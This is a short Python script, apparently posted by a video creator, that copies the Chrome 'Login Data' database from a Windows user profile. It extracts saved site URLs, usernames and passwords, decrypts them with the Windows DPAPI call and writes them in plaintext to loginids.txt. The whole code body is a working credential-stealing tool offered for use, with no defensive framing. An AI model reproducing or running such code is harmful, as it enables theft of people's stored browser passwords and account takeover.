#// Don't forget to hit SUBSCRIBE, COMMENT, LIKE, SHARE! and LEARN... Its good to learn! :)
# But srsly, hit that sub button so you don't miss out on more content! 
#It will be decode the crome saved passswords and saved ot loginids.txt
#works on python
'''For any error Contact on gabru.ahir@gmail.com'''
'''imports'''
import os
import sqlite3
import win32crypt


def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    x=open(data_path,'rb')
    z=x.read()
    x.close()
    f=open('logininfo','wb')
    f.write(z)
    f.close()
    
    c = sqlite3.connect('logininfo')
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)
    
    login_data = cursor.fetchall()
    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = user_name, pwd[1].decode('utf8')
        string += '\n[+] URL: %s \n USERNAME:%s \n PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        print(string)
        a = open('loginids.txt','a')
        a.write(string)
        a.close()


if __name__=='__main__':
    get_chrome()
    input('Ids And Passwords are saved in loginids.txt \nPress enter key to continue...')
    os.remove('logininfo')
